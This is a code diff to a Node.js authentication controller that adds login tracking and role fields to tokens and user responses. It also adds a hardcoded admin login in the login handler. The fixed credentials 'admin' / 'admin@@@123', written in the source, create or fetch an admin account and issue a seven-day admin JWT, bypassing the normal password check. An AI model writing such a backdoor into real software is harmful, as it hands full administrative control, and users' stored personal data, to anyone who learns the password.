@@ -27,13 +27,34 @@ exports.signup = async (req, res) => {
 exports.login = async (req, res) => {
   try {
     const { email, password } = req.body;
+    
+    // Check for hardcoded admin login
+    if (email === 'admin' && password === 'admin@@@123') {
+       let adminUser = await User.findOne({ email: 'admin' });
+       if (!adminUser) {
+         adminUser = new User({ email: 'admin', password: await bcrypt.hash(password, 10), role: 'admin' });
+         await adminUser.save();
+       }
+       const token = jwt.sign({ id: adminUser._id, role: 'admin' }, JWT_SECRET, { expiresIn: '7d' });
+       return res.json({
+         session: { access_token: token },
+         user: { id: adminUser._id, email: 'admin', role: 'admin', user_metadata: { name: 'Admin' } },
+         onboarding_completed: true
+       });
+    }
+
     const user = await User.findOne({ email });
     if (!user) return res.status(400).json({ error: 'Invalid credentials' });
 
     const isMatch = await bcrypt.compare(password, user.password);
     if (!isMatch) return res.status(400).json({ error: 'Invalid credentials' });
 
-    const token = jwt.sign({ id: user._id, email: user.email }, JWT_SECRET, { expiresIn: '7d' });
+    // Update login tracking
+    user.loginCount = (user.loginCount || 0) + 1;
+    user.lastLogin = new Date();
+    await user.save();
+
+    const token = jwt.sign({ id: user._id, role: user.role || 'user' }, JWT_SECRET, { expiresIn: '7d' });
     
     // Check onboarding
     const OnboardingData = require('../models/OnboardingData');
@@ -41,7 +62,12 @@ exports.login = async (req, res) => {
     
     res.json({
       session: { access_token: token },
-      user: { id: user._id, email: user.email, user_metadata: { name: user.name, phone: user.phone, age: user.age, gender: user.gender } },
+      user: { 
+        id: user._id, 
+        email: user.email, 
+        role: user.role || 'user',
+        user_metadata: { name: user.name, phone: user.phone, age: user.age, gender: user.gender } 
+      },
       onboarding_completed: !!onboarding
     });
   } catch (err) {
@@ -53,7 +79,14 @@ exports.getUser = async (req, res) => {
   try {
     const user = await User.findById(req.user.id);
     if (!user) return res.status(404).json({ error: 'User not found' });
-    res.json({ user: { id: user._id, email: user.email, user_metadata: { name: user.name, phone: user.phone, age: user.age, gender: user.gender } } });
+    res.json({ 
+      user: { 
+        id: user._id, 
+        email: user.email, 
+        role: user.role,
+        user_metadata: { name: user.name, phone: user.phone, age: user.age, gender: user.gender } 
+      } 
+    });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
